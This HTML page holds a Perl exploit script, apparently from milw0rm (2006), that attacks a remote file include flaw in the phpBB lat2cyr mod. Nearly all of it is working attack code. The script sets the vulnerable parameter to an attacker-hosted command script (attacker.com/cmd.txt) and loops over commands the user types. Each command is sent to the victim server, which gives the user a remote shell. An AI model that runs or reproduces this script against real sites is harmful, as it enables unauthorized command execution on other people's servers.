<html><head><title>phpBB lat2cyr Mod 1.0.1 (lat2cyr.php) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl
 
#####################################################################################################
#                                                                                                   #
# phpBB lat2cyr 1.0.1                                                                               #
#                                                                                                   #
# Class:  Remote File Include Vulnerability                                                         #
#                                                                                                   #
# Patch:  unavailable                                                                               #
#                                                                                                   #
# Date:   2006/10/12                                                                                #
#                                                                                                   #
# Remote: Yes                                                                                       #
#                                                                                                   #
# Type:   high                                                                                      #
#                                                                                                   #
# Site:   http://www.phpbbhacks.com/download/4808                                                   #
#                                                                                                   #
#####################################################################################################


use IO::Socket;
use LWP::Simple;

$cmdshell=&quot;http://attacker.com/cmd.txt&quot;;   # &lt;====== Change This Line With Your Personal Script

print &quot;\n&quot;;
print &quot;##########################################################################\n&quot;;
print &quot;#                                                                        #\n&quot;;
print &quot;# phpBB lat2cyr &lt;= 1.0.1    Remote File Include Vulnerability            #\n&quot;;
print &quot;# Bug found By : Ashiyane Corporation                                    #\n&quot;;
print &quot;# Email: nima salehi    nima[at]ashiyane.ir                              #\n&quot;;
print &quot;# Web Site : www.Ashiyane.ir                                             #\n&quot;;
print &quot;#                                                                        #\n&quot;;
print &quot;##########################################################################\n&quot;;


if (@ARGV &lt; 2)
{
    print &quot;\n Usage: Ashiyane.pl [host] [path] &quot;;
    print &quot;\n EX : Ashiyane.pl www.victim.com /path/  \n\n&quot;;
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];
$vul=&quot;lat2cyr.php?phpbb_root_path=&quot;

print &quot;Type Your Commands ( uname -a )\n&quot;;
print &quot;For Exiit Type END\n&quot;;

print &quot;&lt;Shell&gt; &quot;;$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;END&quot;) {
    $socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Could not connect to host.\n\n&quot;;

    print $socket &quot;GET &quot;.$path.$vul.$cmdshell.&quot;?cmd=&quot;.$cmd.&quot;? HTTP/1.1\r\n&quot;;
    print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
    print $socket &quot;Accept: */*\r\n&quot;;
    print $socket &quot;Connection: close\r\n\n&quot;;

    while ($raspuns = &lt;$socket&gt;)
    {
        print $raspuns;
    }

    print &quot;&lt;Shell&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
}

# milw0rm.com [2006-10-13]</pre></html>